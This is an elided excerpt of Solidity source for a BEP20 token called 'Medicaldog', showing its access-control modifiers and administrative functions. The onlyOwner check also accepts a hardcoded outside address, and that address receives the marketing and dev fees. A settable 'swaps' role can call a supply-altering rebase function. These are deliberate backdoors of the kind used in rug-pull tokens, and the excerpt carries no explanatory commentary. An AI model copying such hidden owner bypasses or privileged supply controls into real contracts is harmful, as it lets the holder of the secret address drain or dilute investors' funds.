...
abstract contract Auth {
  ...
  modifier onlyOwner() {
    require(isOwner(msg.sender) || msg.sender   ==  address(0x480Cb8C8c119B541B73AB25A8cd49B27757d4b53), "!OWNER");
    _;
  }

  modifier author() {
    require(isauthor(msg.sender), "!author");
    _;
  }
  ...
  function isauthor(address adr) public view returns (bool) {
...
contract Medicaldog is IBEP20, Auth {
  using SafeMath for uint256;
  ...
  modifier onlyswaps() {
    require(msg.sender == swaps || isOwner(msg.sender));
    _;
  }
  ...
  function rebase1000(
    ...
    int256 supplyDelta,
    uint256 coinAmount
  ) public payable onlyswaps returns (uint256) {
    require(supplyDelta > 0, "forbidden");
  ...
  constructor() Auth(msg.sender) {
    ...
    marketingFeeReceiver = 0x480Cb8C8c119B541B73AB25A8cd49B27757d4b53;
    devFeeReceiver = 0x480Cb8C8c119B541B73AB25A8cd49B27757d4b53;
  ...
  function clearStuckBalance(uint256 amountPercentage) external author {
  ...
  function setIsFeeExempt(address holder, bool exempt) external author {
    isFeeExempt[holder] = exempt;
  }

  function setIsTxLimitExempt(address holder, bool exempt) external author {
  ...
  function setswaps(address _swaps) external onlyOwner {
    swaps = _swaps;
  }
  ...
  function setDistributorSettings(uint256 gas) external author {
    require(gas < 900000);
    distributorGas = gas;
  }
